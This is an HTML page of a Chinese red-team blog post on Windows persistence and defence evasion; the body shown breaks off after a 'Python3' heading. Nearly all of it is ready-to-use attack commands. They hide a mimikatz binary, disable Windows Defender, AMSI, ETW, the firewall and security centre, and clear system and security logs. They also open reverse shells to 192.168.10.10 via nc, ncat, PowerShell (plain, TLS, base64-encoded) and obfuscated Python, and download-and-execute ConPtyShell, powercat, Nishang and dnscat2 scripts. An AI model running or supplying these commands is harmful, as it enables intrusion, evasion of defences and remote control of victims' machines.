<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="本文研究Windwos环境下权限维持思路及方法...">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows持久化技术研究">
<meta property="og:url" content="https://l0n9w4y.cc/posts/88001/index.html">
<meta property="og:site_name" content="L0n9w4y">
<meta property="og:description" content="本文研究Windwos环境下权限维持思路及方法...">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-06-29T14:49:15.000Z">
<meta property="article:modified_time" content="2022-10-25T15:36:09.506Z">
<meta property="article:author" content="L0n9w4y">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Persistence">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://l0n9w4y.cc/posts/88001/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/88001/","path":"posts/88001/","title":"Windows持久化技术研究"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Windows持久化技术研究 | L0n9w4y</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">L0n9w4y</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/security/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E8%A7%84%E9%81%BF%E9%9A%90%E8%97%8F"><span class="nav-text">0x00 规避隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%9A%90%E8%97%8F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="nav-text">1. 隐藏二进制文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%A6%81%E7%94%A8-Windows-Defender"><span class="nav-text">2. 禁用 Windows Defender</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%A6%81%E7%94%A8-Windows-%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-text">3. 禁用 Windows 防火墙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%B8%85%E9%99%A4%E7%B3%BB%E7%BB%9F-x2F-%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97"><span class="nav-text">4. 清除系统&#x2F;安全日志</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">0x01 反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-CMD"><span class="nav-text">1. CMD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Powershell"><span class="nav-text">2. Powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-powercat"><span class="nav-text">3. powercat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Nishang"><span class="nav-text">4. Nishang</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Dnscat"><span class="nav-text">5. Dnscat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Python"><span class="nav-text">6. Python</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-text">0x02 计划任务后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-schtasks%E5%91%BD%E4%BB%A4"><span class="nav-text">1. schtasks命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Powershell%E6%96%B9%E5%BC%8F"><span class="nav-text">2. Powershell方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-HKLM-%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%8E%E9%97%A8"><span class="nav-text">0x03 HKLM 注册表后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E7%A1%80%E6%96%B9%E5%BC%8F"><span class="nav-text">1. 基础方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Winlogon-Helper-DLL"><span class="nav-text">2. Winlogon Helper DLL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-GlobalFlag"><span class="nav-text">3. GlobalFlag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E8%87%AA%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-text">0x04 自启动服务后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Powershell"><span class="nav-text">1. Powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-sc"><span class="nav-text">2. sc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SharPersist"><span class="nav-text">3. SharPersist</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85"><span class="nav-text">0x05 WMI事件订阅</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-CMD%E5%91%BD%E4%BB%A4"><span class="nav-text">1. CMD命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Powershell%E5%91%BD%E4%BB%A4"><span class="nav-text">2. Powershell命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-RDP%E5%90%8E%E9%97%A8"><span class="nav-text">0x06 RDP后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-utilman-exe"><span class="nav-text">1. utilman.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-sethc-exe"><span class="nav-text">2. sethc.exe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-RDS-Shadowing%E5%90%8E%E9%97%A8"><span class="nav-text">0x07 RDS Shadowing后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-BITS-Jobs"><span class="nav-text">0x08 BITS Jobs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
      src="/images/hexo.png">
  <p class="site-author-name" itemprop="name">L0n9w4y</p>
  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">36</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">35</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/88001/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hexo.png">
      <meta itemprop="name" content="L0n9w4y">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L0n9w4y">
      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Windows持久化技术研究 | L0n9w4y">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Windows持久化技术研究
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-06-29 22:49:15" itemprop="dateCreated datePublished" datetime="2022-06-29T22:49:15+08:00">2022-06-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">红队渗透</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center>本文研究Windwos环境下权限维持思路及方法...</center>

<span id="more"></span>
<hr>
<h2 id="0x00-规避隐藏"><a href="#0x00-规避隐藏" class="headerlink" title="0x00 规避隐藏"></a>0x00 规避隐藏</h2><h3 id="1-隐藏二进制文件"><a href="#1-隐藏二进制文件" class="headerlink" title="1. 隐藏二进制文件"></a>1. 隐藏二进制文件</h3><pre class="language-none"><code class="language-none">PS&gt; attrib +h mimikatz.exe</code></pre>

<h3 id="2-禁用-Windows-Defender"><a href="#2-禁用-Windows-Defender" class="headerlink" title="2. 禁用 Windows Defender"></a>2. 禁用 Windows Defender</h3><pre class="language-none"><code class="language-none"># 禁用Defender
sc config WinDefend start&#x3D; disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

# 禁用扫描所有下载的文件和附件，禁用 AMSI
PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\&gt; Set-MpPreference -DisableIOAVProtection $true

# 禁用 AMSI（设置为0启用）
PS C:\&gt; Set-MpPreference -DisableScriptScanning 1 

# 将ETW 会话对应的注册表值清零
reg add &quot;HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger&quot; &#x2F;v &quot;Start&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f

# 擦除当前存储的definitions
MpCmdRun.exe -RemoveDefinitions -All

# 删除签名
PS &gt; &amp; &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot; -RemoveDefinitions -All
PS &gt; &amp; &quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot; -RemoveDefinitions -All

# 禁用 Windows Defender 安全中心
reg add &quot;HKLM\System\CurrentControlSet\Services\SecurityHealthService&quot; &#x2F;v &quot;Start&quot; &#x2F;t REG_DWORD &#x2F;d &quot;4&quot; &#x2F;f

# 禁用实时保护功能
reg delete &quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot; &#x2F;f
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot; &#x2F;v &quot;DisableAntiSpyware&quot; &#x2F;t REG_DWORD &#x2F;d &quot;1&quot; &#x2F;f
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot; &#x2F;v &quot;DisableAntiVirus&quot; &#x2F;t REG_DWORD &#x2F;d &quot;1&quot; &#x2F;f</code></pre>

<h3 id="3-禁用-Windows-防火墙"><a href="#3-禁用-Windows-防火墙" class="headerlink" title="3. 禁用 Windows 防火墙"></a>3. 禁用 Windows 防火墙</h3><pre class="language-none"><code class="language-none">Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off</code></pre>

<h3 id="4-清除系统-x2F-安全日志"><a href="#4-清除系统-x2F-安全日志" class="headerlink" title="4. 清除系统&#x2F;安全日志"></a>4. 清除系统&#x2F;安全日志</h3><pre class="language-none"><code class="language-none">cmd.exe &#x2F;c wevtutil.exe cl System
cmd.exe &#x2F;c wevtutil.exe cl Security</code></pre>

<h2 id="0x01-反弹shell"><a href="#0x01-反弹shell" class="headerlink" title="0x01 反弹shell"></a>0x01 反弹shell</h2><h3 id="1-CMD"><a href="#1-CMD" class="headerlink" title="1. CMD"></a>1. CMD</h3><pre class="language-none"><code class="language-none">nc.exe 192.168.10.10 6666 -e cmd

nc -e cmd 192.168.10.10 6666

ncat.exe 192.168.10.10 6666 -e cmd

ncat 192.168.10.10 6666 -e c:\windows\system32\cmd.exe</code></pre>

<h3 id="2-Powershell"><a href="#2-Powershell" class="headerlink" title="2. Powershell"></a>2. Powershell</h3><pre class="language-none"><code class="language-none">nc.exe 192.168.10.10 6666 -e powershell

ncat.exe 192.168.10.10 6666 -e powershell

IEX(IWR https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;antonioCoco&#x2F;ConPtyShell&#x2F;master&#x2F;Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.10.10 6666

powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;192.168.10.10&quot;,6666);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()

powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;192.168.10.10&#39;,6666);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;

powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient &#x3D; New-Object Net.Sockets.TCPClient(&#39;192.168.10.10&#39;, 6666);$NetworkStream &#x3D; $TCPClient.GetStream();$StreamWriter &#x3D; New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer &#x3D; 0..$TCPClient.ReceiveBufferSize | % &#123;0&#125;;$StreamWriter.Write($String + &#39;SHELL&gt; &#39;);$StreamWriter.Flush()&#125;WriteToStream &#39;&#39;;while(($BytesRead &#x3D; $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) &#123;$Command &#x3D; ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output &#x3D; try &#123;Invoke-Expression $Command 2&gt;&amp;1 | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;

powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient &#x3D; New-Object Net.Sockets.TCPClient(&#39;192.168.10.10&#39;, 6666);$NetworkStream &#x3D; $TCPClient.GetStream();$SslStream &#x3D; New-Object Net.Security.SslStream($NetworkStream,$false,(&#123;$true&#125; -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(&#39;cloudflare-dns.com&#39;,$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) &#123;$SslStream.Close();exit&#125;$StreamWriter &#x3D; New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer &#x3D; 0..$TCPClient.ReceiveBufferSize | % &#123;0&#125;;$StreamWriter.Write($String + &#39;SHELL&gt; &#39;);$StreamWriter.Flush()&#125;;WriteToStream &#39;&#39;;while(($BytesRead &#x3D; $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) &#123;$Command &#x3D; ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output &#x3D; try &#123;Invoke-Expression $Command 2&gt;&amp;1 | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;   # TLS

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAyADcALgAwAC4AMAAuADEAIgAsADYANgA2ADYAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA  # Base64</code></pre>

<h3 id="3-powercat"><a href="#3-powercat" class="headerlink" title="3. powercat"></a>3. powercat</h3><pre class="language-none"><code class="language-none">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.10.10 -p 1234 -e cmd  # 远程下载执行

Import-Module .&#x2F;powercat.ps1  # 下载到本地执行
powercat -c 192.168.10.10 -p 1234 -e cmd</code></pre>

<h3 id="4-Nishang"><a href="#4-Nishang" class="headerlink" title="4. Nishang"></a>4. Nishang</h3><pre class="language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.10.10 -port 1234  # TCP协议

powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.10.10 -port 1234  # UDP协议

powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.10.11&#x2F;nishang&#x2F;Shells&#x2F;Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp -IPAddress 192.168.10.11  # ICMP协议</code></pre>

<h3 id="5-Dnscat"><a href="#5-Dnscat" class="headerlink" title="5. Dnscat"></a>5. Dnscat</h3><pre class="language-none"><code class="language-none">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer 10.0.0.1</code></pre>

<h3 id="6-Python"><a href="#6-Python" class="headerlink" title="6. Python"></a>6. Python</h3><pre class="language-none"><code class="language-none">1）Python2

python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;192.168.10.10&#39;, 6666)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), &#123;&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&#39;try&#39;, (), &#123;&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target&#x3D;p2s, args&#x3D;[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target&#x3D;s2p, args&#x3D;[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.STDOUT, stdin&#x3D;subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(&#123;&#125;), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(&#123;&#125;), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;


3）Python3

